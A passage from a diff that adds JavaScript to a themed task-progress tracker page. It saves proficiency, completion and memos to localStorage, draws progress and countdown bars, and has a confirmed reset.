+    else progress[pid][tid].prof = val;
+    
+    save();
+    renderTasks(pid, document.querySelector('.search').value);
+}
+
+function toggleDone(pid, tid) {
+    if(!progress[pid]) progress[pid] = {};
+    if(!progress[pid][tid]) progress[pid][tid] = { prof: 0, memo: '' };
+    
+    progress[pid][tid].done = !progress[pid][tid].done;
+    if(progress[pid][tid].done) progress[pid][tid].prof = 3;
+    
+    save();
+    renderTasks(pid, document.querySelector('.search').value);
+}
+
+function saveMemo(pid, tid, val) {
+    if(!progress[pid]) progress[pid] = {};
+    if(!progress[pid][tid]) progress[pid][tid] = { prof: 0, done: false };
+    progress[pid][tid].memo = val;
+    localStorage.setItem('titan_v29', JSON.stringify(progress));
+}
+
+function save() {
+    localStorage.setItem('titan_v29', JSON.stringify(progress));
+    updateGlobal();
+}
+
+function updateGlobal() {
+    let total = 0, done = 0;
+    DB.forEach((p, idx) => {
+        total += p.tasks.length;
+        const pData = progress[idx] || {};
+        Object.values(pData).forEach(v => { if(v.done) done++; });
+    });
+    
+    const pct = Math.round((done/total)*100) || 0;
+    document.getElementById('bar-neo').style.width = pct + '%';
+    
+    // Critical Mode Check
+    const timePct = parseFloat(document.getElementById('bar-smith').style.width);
+    if(timePct > pct) document.body.classList.add('critical');
+    else document.body.classList.remove('critical');
+}
+
+function timer() {
+    const start = new Date("2024-01-01").getTime();
+    const end = new Date("2026-06-01").getTime();
+    const now = new Date().getTime();
+    const days = Math.floor((end - now) / (1000*60*60*24));
+    
+    document.getElementById('days-left').innerText = days + " DAYS REMAINING";
+    
+    const tPct = Math.min(Math.max((now - start) / (end - start) * 100, 0), 100);
+    document.getElementById('bar-smith').style.width = tPct + '%';
+    
+    updateGlobal(); 
+}
+
+function hardReset() {
+    if(confirm("INITIATE FACTORY RESET?")) { localStorage.clear(); location.reload(); }
+}
 </script>
 </body>
 </html>
